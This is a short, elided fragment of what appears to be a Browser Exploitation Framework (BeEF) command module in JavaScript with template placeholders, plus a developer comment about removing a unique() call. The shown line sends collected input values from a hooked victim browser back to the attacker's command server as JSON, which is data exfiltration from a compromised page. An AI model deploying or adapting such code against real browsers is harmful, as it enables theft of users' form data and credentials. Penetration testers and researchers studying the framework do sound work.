...
beef.execute(function() {
    ...
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+JSON.stringify(input_values)); //Removed unique(), because is making error when trying to execute the module. Changed by BenVerdiman
